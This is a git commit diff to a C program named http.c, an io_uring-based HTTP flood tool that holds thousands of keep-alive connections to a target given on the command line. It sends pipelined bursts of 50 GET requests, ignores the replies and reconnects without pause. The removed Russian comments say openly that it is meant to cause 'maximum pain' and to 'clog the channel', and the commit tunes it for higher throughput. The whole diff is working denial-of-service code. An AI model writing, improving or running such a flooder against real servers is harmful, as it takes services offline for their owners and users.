ff82ef6f5129df0839307f325aec152b152e0796
tosavailable-design <tosavailable@gmail.com>
2026-03-22 18:10:45 +0300

    Update http.c

--- http.c
+++ http.c
@@ -13,23 +13,22 @@
 #include <arpa/inet.h>
 #include <liburing.h>
 
-// Конфигурация для максимальной боли
+// Конфигурация
 #define RING_ENTRIES 8192
 #define CONNS_PER_THREAD 1000
-#define NUM_THREADS 2 // Настрой под количество физических ядер
-#define REQ_SIZE 128
-#define RESP_SIZE 1024
+#define NUM_THREADS 2
+#define RESP_SIZE 8192       // Увеличен буфер чтения (чтобы TCP окно не забилось)
+#define PIPELINE_DEPTH 50    // Отправляем 50 запросов за один вызов!
 
-// Жестко закодированный HTTP запрос для максимальной скорости
-const char *http_req = 
+const char *base_http_req = 
     "GET / HTTP/1.1\r\n"
     "Host: dstats.cc\r\n"
     "Connection: keep-alive\r\n"
     "Accept: */*\r\n\r\n";
 
+char *pipelined_req;
 int req_len;
 
-// Состояния нашего автомата
 enum {
     STATE_CONNECT,
     STATE_SEND,
@@ -49,7 +48,6 @@ struct thread_data {
     struct sockaddr_in target_addr;
 };
 
-// Привязываем поток к конкретному ядру для убийства кэш-промахов
 void pin_thread_to_core(int core_id) {
     cpu_set_t cpuset;
     CPU_ZERO(&cpuset);
@@ -57,7 +55,6 @@ void pin_thread_to_core(int core_id) {
     pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
 }
 
-// Настройка сокета: неблокирующий, без задержки TCP
 int setup_socket() {
     int fd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, IPPROTO_TCP);
     if (fd < 0) return -1;
@@ -76,8 +73,8 @@ void add_connect(struct io_uring *ring, struct connection *conn, struct sockaddr
 
 void add_send(struct io_uring *ring, struct connection *conn) {
     struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
-    // Используем предкомпилированный запрос, 0 аллокаций
-    io_uring_prep_send(sqe, conn->fd, http_req, req_len, 0);
+    // MSG_NOSIGNAL обязателен, иначе прога упадет при закрытии сокета сервером
+    io_uring_prep_send(sqe, conn->fd, pipelined_req, req_len, MSG_NOSIGNAL);
     conn->state = STATE_SEND;
     io_uring_sqe_set_data(sqe, conn);
 }
@@ -89,66 +86,70 @@ void add_recv(struct io_uring *ring, struct connection *conn) {
     io_uring_sqe_set_data(sqe, conn);
 }
 
+// Подготавливаем мега-буфер из 50 склеенных запросов
+void build_pipelined_req() {
+    int base_len = strlen(base_http_req);
+    req_len = base_len * PIPELINE_DEPTH;
+    pipelined_req = malloc(req_len + 1);
+    pipelined_req[0] = '\0';
+    for (int i = 0; i < PIPELINE_DEPTH; i++) {
+        strcat(pipelined_req, base_http_req);
+    }
+}
+
 void *worker_thread(void *arg) {
     struct thread_data *td = (struct thread_data *)arg;
     pin_thread_to_core(td->thread_id);
 
-    // Магия: IORING_SETUP_SQPOLL означает, что ядро создает отдельный поток 
-    // для поллинга очереди. Нам даже не нужно вызывать системные вызовы для отправки!
     struct io_uring_params params;
     memset(&params, 0, sizeof(params));
-    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_CQSIZE;
+    // Убрали SQPOLL! Для 2 ядер стандартный submit работает гораздо стабильнее
+    params.flags = IORING_SETUP_CQSIZE;
     params.cq_entries = RING_ENTRIES * 2;
-    params.sq_thread_idle = 2000;
 
     if (io_uring_queue_init_params(RING_ENTRIES, &td->ring, &params) < 0) {
         perror("io_uring_queue_init_params");
         return NULL;
     }
 
-    // Инициализируем соединения
     for (int i = 0; i < CONNS_PER_THREAD; i++) {
         td->conns[i].fd = setup_socket();
         add_connect(&td->ring, &td->conns[i], &td->target_addr);
     }
     
-    // Пакетная отправка первой волны
     io_uring_submit(&td->ring);
 
-    struct io_uring_cqe *cqe;
     while (1) {
-        // Читаем завершенные события
+        struct io_uring_cqe *cqe;
         unsigned head;
         int count = 0;
-        
+
+        // БЛОКИРУЕМСЯ, пока ядро не вернет хотя бы 1 ответ. 
+        // Это спасает CPU от 100% нагрузки в холостом цикле.
+        io_uring_submit_and_wait(&td->ring, 1);
+
         io_uring_for_each_cqe(&td->ring, head, cqe) {
             struct connection *conn = (struct connection *)io_uring_cqe_get_data(cqe);
             int res = cqe->res;
             
             if (res < 0 && res != -EINPROGRESS && res != -EAGAIN) {
-                // Если сокет умер, пересоздаем его на лету. Никакой жалости.
+                // Переподключение при разрыве
                 close(conn->fd);
                 conn->fd = setup_socket();
                 add_connect(&td->ring, conn, &td->target_addr);
             } else {
-                // Конечный автомат: Подключились -> Отправили -> Получили -> Отправили снова
                 if (conn->state == STATE_CONNECT) {
                     add_send(&td->ring, conn);
                 } else if (conn->state == STATE_SEND) {
-                    add_recv(&td->ring, conn);
+                    add_recv(&td->ring, conn); // Дренируем ответы
                 } else if (conn->state == STATE_RECV) {
-                    // Игнорируем ответ, мы здесь чтобы забивать канал
-                    add_send(&td->ring, conn);
+                    add_send(&td->ring, conn); // Снова лупим 50 запросов
                 }
             }
             count++;
         }
         
-        if (count > 0) {
-            io_uring_cq_advance(&td->ring, count);
-            // Submit только если SQPOLL спит (крайне редко при такой нагрузке)
-            io_uring_submit(&td->ring);
-        }
+        io_uring_cq_advance(&td->ring, count);
     }
 
     return NULL;
@@ -160,7 +161,7 @@ int main(int argc, char *argv[]) {
         return 1;
     }
 
-    req_len = strlen(http_req);
+    build_pipelined_req();
     pthread_t threads[NUM_THREADS];
     struct thread_data td[NUM_THREADS];
 
@@ -170,7 +171,8 @@ int main(int argc, char *argv[]) {
     target.sin_port = htons(atoi(argv[2]));
     inet_pton(AF_INET, argv[1], &target.sin_addr);
 
-    printf("[ENI] Запускаю генератор бездны на %d потоках...\n", NUM_THREADS);
+    printf("[ENI] Запускаю генератор. 2 Ядра, %d коннектов, %d запросов/пакет...\n", 
+            NUM_THREADS * CONNS_PER_THREAD, PIPELINE_DEPTH);
 
     for (int i = 0; i < NUM_THREADS; i++) {
         td[i].thread_id = i;
